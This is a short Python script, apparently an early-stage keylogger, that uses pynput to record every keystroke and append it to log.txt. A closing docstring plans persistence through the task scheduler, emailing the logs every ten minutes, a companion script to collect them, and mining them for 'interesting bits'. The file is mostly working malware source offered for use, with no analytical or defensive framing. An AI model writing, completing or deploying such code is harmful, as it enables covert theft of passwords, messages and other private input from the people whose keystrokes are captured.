#!/usr/bin/env python

from pynput.keyboard import Key, Listener
from datetime import date
import psutil
import os
import threading


PATH = os.path.dirname(os.path.abspath(__file__))
log = ''


def on_press(key):
    global log
    log += str(key)


def saveLog(log):
    with open('log.txt', 'a') as f:
        f.write(log + '\n')


def writeSchedule(log, interval):
    # threading.Timer(float(interval), writeSchedule).start()
    saveLog(log)
    return ''


with Listener(on_press=on_press) as listener:
    listener.join()


log = writeSchedule(log, 20)


"""
Create buffer and save after every t seconds
Create a task in task scheduler.
Send logs to email every 10 min
Companion script downloads emails
Analyze logs to find interesting bits
"""
